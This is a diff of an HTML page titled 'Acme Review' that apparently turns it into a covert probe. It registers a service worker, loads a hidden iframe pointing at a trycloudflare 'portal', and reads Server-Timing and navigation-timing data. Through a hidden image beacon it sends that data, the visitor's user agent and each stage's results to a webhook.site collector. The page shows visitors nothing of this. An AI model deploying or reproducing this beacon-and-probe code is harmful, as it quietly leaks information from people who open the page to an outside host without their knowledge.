@@ -3,67 +3,120 @@
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Acme Review</title>
 </head>
 <body>
   <h2>Acme Review</h2>
-
   <pre id="result">Starting...</pre>
 
   <script>
+    const PORTAL =
+      "https://originally-yours-respondents-combined.trycloudflare.com";
+
+    const HOOK =
+      "https://webhook.site/ecf90bba-d52e-4352-b2d5-3b81ce45a357";
+
     const output = document.getElementById("result");
 
-    function log(message) {
-      output.textContent += "\n" + message;
-      console.log(message);
+    function log(stage, data = {}) {
+      const report = {
+        stage,
+        data,
+        userAgent: navigator.userAgent
+      };
+
+      output.textContent +=
+        "\n" + JSON.stringify(report, null, 2);
+
+      console.log(report);
+
+      // 실행 결과를 Webhook.site에서 확인
+      const img = new Image();
+      img.style.display = "none";
+      img.src =
+        HOOK +
+        "?event=" + encodeURIComponent(stage) +
+        "&data=" + encodeURIComponent(
+          JSON.stringify(report).slice(0, 1500)
+        ) +
+        "&t=" + Date.now();
+
+      document.body.appendChild(img);
     }
 
-    // iframe 내부에서 보낸 결과 받기
-    window.addEventListener("message", (event) => {
-      if (event.origin !== location.origin) {
-        return;
-      }
-
-      if (event.data?.type === "navigation-result") {
-        log("Navigation result:");
-        log(JSON.stringify(event.data.timing, null, 2));
-      }
-    });
-
     async function main() {
-      try {
-        if (!("serviceWorker" in navigator)) {
-          log("Service Worker not supported");
-          return;
-        }
+      log("page-opened");
 
-        // 1. Service Worker 등록
-        await navigator.serviceWorker.register("./sw.js");
+      try {
+        await navigator.serviceWorker.register(
+          "./sw.js?v=5",
+          { updateViaCache: "none" }
+        );
+
         await navigator.serviceWorker.ready;
 
-        // 2. 페이지가 SW 제어를 받도록 새로고침
         if (!navigator.serviceWorker.controller) {
           location.reload();
           return;
         }
 
-        output.textContent = "Service Worker ready";
+        log("sw-ready");
 
-        // 3. SW가 처리할 navigation 생성
         const frame = document.createElement("iframe");
+        frame.style.display = "none";
 
-        frame.src = "./probe?t=" + Date.now();
+        frame.onload = () => {
+          log("frame-loaded");
 
-        frame.style.width = "600px";
-        frame.style.height = "200px";
+          // 부모 문서의 리소스 성능 정보
+          const resources =
+            performance.getEntriesByType("resource")
+              .filter(e => e.name.includes("/probe"));
+
+          log("parent-timing", resources.map(e => ({
+            name: e.name,
+            serverTiming: e.serverTiming
+          })));
+
+          // iframe 문서의 Navigation Timing 정보
+          try {
+            const nav =
+              frame.contentWindow.performance
+                .getEntriesByType("navigation")[0];
+
+            log("navigation-timing", {
+              name: nav?.name,
+              serverTiming: (nav?.serverTiming || [])
+                .map(t => ({
+                  name: t.name,
+                  description: t.description,
+                  duration: t.duration
+                }))
+            });
+          } catch (error) {
+            log("navigation-error", {
+              message: error.message
+            });
+          }
+        };
+
+        frame.onerror = () => {
+          log("frame-error");
+        };
+
+        frame.src =
+          "./probe?portal=" +
+          encodeURIComponent(PORTAL) +
+          "&t=" + Date.now();
 
         document.body.appendChild(frame);
 
-        log("Navigation started");
+        log("probe-started");
 
       } catch (error) {
-        log("Main error: " + error.message);
+        log("main-error", {
+          message: error.message
+        });
       }
     }
 
@@ -71,3 +124,4 @@
   </script>
 </body>
 </html>
+
